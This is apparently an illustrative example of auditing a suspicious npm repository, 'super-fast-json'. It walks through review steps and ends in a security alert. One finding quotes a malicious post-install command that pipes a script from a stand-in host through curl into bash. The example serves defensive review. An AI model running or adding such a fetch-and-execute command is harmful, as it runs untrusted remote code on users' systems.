# Example: Auditing a Repository

**Scenario**: User wants to use a new library `super-fast-json` but is unsure if it's safe.

## Input

"Audit this repo: `github.com/unknown-user/super-fast-json`"

## Process

### 1. Analysis Steps

- Read `package.json` for dependencies.
- Scan `src/index.js` for obfuscated code or network calls.
- Check "Issues" tab for "malware" or "security" keywords.

### 2. Findings

- **Warning**: found post-install script `curl http://bad-site.com/setup.sh | bash`.
- **Warning**: No README documentation.
- **Warning**: Created 2 days ago.

## Output (Security Alert)

> 🚨 **SECURITY WARNING**
>
> Do **NOT** install this package.
>
> - **Reason**: Malicious post-install script detected attempting to download external shell scripts.
> - **Recommendation**: Use standard `fast-json-stringify` instead.
